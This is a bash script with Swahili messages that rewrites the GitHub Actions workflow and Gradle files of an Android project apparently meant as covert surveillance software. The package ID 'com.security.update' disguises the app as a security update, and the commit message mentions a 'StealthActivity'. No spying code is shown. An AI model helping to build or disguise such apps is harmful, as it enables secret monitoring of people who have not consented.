#!/bin/bash
cd ~/android-surveillance-final2

echo "🔧 KUREKEBISHA GITHUB ACTIONS KABISA..."
echo "======================================"

# 1. Futa workflows zote zilizopo
echo ""
echo "🗑️  INAONDOA WORKFLOWS ZA ZAMANI..."
rm -rf .github/workflows/*

# 2. Tengeneza workflow mpya rahisi na inayofanya kazi
echo ""
echo "📝 INAUNDA WORKFLOW MPYA..."
mkdir -p .github/workflows
cat > .github/workflows/build-apk.yml << 'WORKFLOW'
name: Build APK

on:
  push:
    branches: [main]
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    
    steps:
    - name: Checkout code
      uses: actions/checkout@v4
      
    - name: Setup Java
      uses: actions/setup-java@v4
      with:
        java-version: '17'
        distribution: 'temurin'
        
    - name: Setup Android SDK
      uses: android-actions/setup-android@v3
      
    - name: Make gradlew executable
      run: chmod +x ./gradlew
      
    - name: Build APK
      run: |
        ./gradlew clean
        ./gradlew assembleDebug --no-daemon --stacktrace
        
    - name: Verify APK exists
      run: |
        echo "🔍 Checking for APK files..."
        if [ -f "app/build/outputs/apk/debug/app-debug.apk" ]; then
          echo "✅ APK found: app/build/outputs/apk/debug/app-debug.apk"
          ls -la app/build/outputs/apk/debug/app-debug.apk
        else
          echo "❌ APK not found in expected location"
          echo "📁 Listing all APK files:"
          find . -name "*.apk" -type f
          exit 1
        fi
        
    - name: Upload APK
      uses: actions/upload-artifact@v4
      with:
        name: surveillance-app
        path: app/build/outputs/apk/debug/app-debug.apk
        retention-days: 90
        
    - name: Success Message
      run: |
        echo "🎉 APK BUILD SUCCESSFUL!"
        echo "📱 Download from Artifacts section"
        echo "🔗 Direct link to artifacts will be available after build completes"
WORKFLOW

# 3. Rekebisha Gradle files kwa uhakika
echo ""
echo "⚙️  INArekebisha GRADLE FILES..."
cat > build.gradle << 'PROJECT_GRADLE'
buildscript {
    repositories {
        google()
        mavenCentral()
    }
    dependencies {
        classpath 'com.android.tools.build:gradle:8.0.0'
    }
}

allprojects {
    repositories {
        google()
        mavenCentral()
    }
}

task clean(type: Delete) {
    delete rootProject.buildDir
}
PROJECT_GRADLE

cat > app/build.gradle << 'APP_GRADLE'
plugins {
    id 'com.android.application'
}

android {
    namespace 'com.security.update'
    compileSdk 33

    defaultConfig {
        applicationId "com.security.update"
        minSdk 21
        targetSdk 33
        versionCode 1
        versionName "1.0"
    }

    buildTypes {
        release {
            minifyEnabled false
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
        }
        debug {
            minifyEnabled false
            debuggable true
        }
    }

    compileOptions {
        sourceCompatibility JavaVersion.VERSION_1_8
        targetCompatibility JavaVersion.VERSION_1_8
    }
}

dependencies {
    implementation 'androidx.appcompat:appcompat:1.6.1'
    implementation 'com.google.android.material:material:1.9.0'
    implementation 'androidx.constraintlayout:constraintlayout:2.1.4'
}
APP_GRADLE

# 4. Push changes kwenye GitHub
echo ""
echo "📤 INApush CHANGES KWENYE GITHUB..."
git add .
git commit -m "🔧 Fix duplicate activities and GitHub Actions
- Removed duplicate MainActivity.java
- Fixed AndroidManifest with only StealthActivity
- Simplified GitHub Actions workflow
- Fixed Gradle configuration"
git push origin main

echo ""
echo "✅ MAREKEBISHO YAMEKAMILIKA!"
echo ""
echo "🚀 SASA NJIA HII ITAFANYA KAZI BILA SHIDA:"
echo "   1. Nenda: https://github.com/CronosKIng/android-surveillance-final2/actions"
echo "   2. Run 'Build APK' workflow"
echo "   3. APK itakuwa kwenye Artifacts section"
echo ""
echo "📱 AU tumia APK ya local iliyorekebishwa: SURVEILLANCE_FIXED.apk"
